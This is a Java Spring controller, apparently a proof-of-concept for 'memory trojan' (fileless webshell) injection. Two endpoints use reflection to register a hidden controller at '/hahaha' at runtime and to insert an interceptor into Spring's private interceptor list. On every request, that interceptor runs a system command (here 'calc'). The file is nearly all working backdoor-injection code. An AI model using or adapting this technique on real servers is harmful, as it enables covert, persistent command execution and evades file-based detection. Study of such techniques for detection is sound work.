package com.yyjccc.memorytrojan.Spring.controller;


import org.apache.catalina.core.ApplicationContext;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Objects;

@RestController
public class MyController {




	@RequestMapping("/test")
	public String index() throws ClassNotFoundException, InstantiationException, IllegalAccessException {
		WebApplicationContext context1 = ContextLoader.getCurrentWebApplicationContext();
		//WebApplicationContext context2 = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
		WebApplicationContext context2 = WebApplicationContextUtils.getWebApplicationContext(Objects.requireNonNull(RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()));
		WebApplicationContext webApplicationContext = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
		WebApplicationContext context3 = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);


		return "shell1";
	}

	@RequestMapping("/sh")
	public String exp() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

		WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
		// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
		RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
		// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
		Method method = (Shell_Controller.class.getDeclaredMethods())[0];
		// 3. 定义访问 controller 的 URL 地址
		PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
		// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
		RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
		// 5. 在内存中动态注册 controller
		RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
		r.registerMapping(info, Class.forName("com.yyjccc.memorytrojan.Spring.controller.Shell_Controller").newInstance(), method);
		return "shell2";
	}



	@RequestMapping("/interceptor")
	public String ShellInterceptor() throws NoSuchFieldException, IllegalAccessException {
		WebApplicationContext context=  RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
		//获取RequestMapping中的adaptedInterceptors
		AbstractHandlerMapping abstractMapping= (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
		Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
		field.setAccessible(true);
		List<HandlerInterceptor>  interceptors= (List<HandlerInterceptor>) field.get(abstractMapping);
		//放入interceptor
		interceptors.add(new Shell_Interceptor());
		field.set(abstractMapping,interceptors);
		return "shell3";
	}


	public class Shell_Interceptor implements HandlerInterceptor{
		@Override
		public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
			System.out.println("Interceptor内存马");
			Runtime.getRuntime().exec("calc");
			return true;
		}
	}

}
